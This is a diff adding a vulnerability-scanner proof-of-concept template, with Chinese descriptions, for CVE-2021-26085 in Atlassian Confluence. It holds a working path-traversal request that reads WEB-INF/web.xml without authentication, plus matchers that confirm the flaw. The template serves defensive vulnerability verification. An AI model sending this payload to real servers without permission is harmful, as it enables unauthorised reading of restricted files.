@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "通过 Confluence /s/ 端点的路径遍历漏洞，验证未经认证的远程攻击者是否可以读取服务器上的受限文件（如 WEB-INF/web.xml），确认漏洞是否存在。"
+id = "POC-AVE-2021-0909"
+name = "Atlassian Confluence 预授权任意文件读取 PoC"
+severity = "medium"
+tags = ["ave-2021-0909"]
+vuln_id = [
+    "CVE-2021-26085",
+    "AVE-2021-0909",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/s/{{randstr}}/_/;/WEB-INF/web.xml"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<display-name>Confluence</display-name>",
+    "com.atlassian.confluence.setup.ConfluenceAppConfig",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
